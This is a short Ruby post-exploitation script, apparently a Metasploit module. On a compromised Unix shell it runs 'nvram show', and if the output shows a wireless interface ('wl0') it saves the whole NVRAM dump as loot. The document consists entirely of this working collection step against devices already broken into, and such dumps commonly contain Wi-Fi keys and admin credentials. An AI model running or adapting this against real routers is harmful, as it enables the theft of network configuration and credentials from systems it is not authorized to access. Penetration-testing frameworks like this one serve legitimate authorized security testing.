##
# $Id$
##

#
# Collect the nvram contents if this is a WAP with the 'nvram' command
#

data = client.shell_command_token_unix("nvram show")
if (data and data =~ /wl0/)
	pro.store_loot("host.unix.nvram", "text/plain", client, data.strip)
end

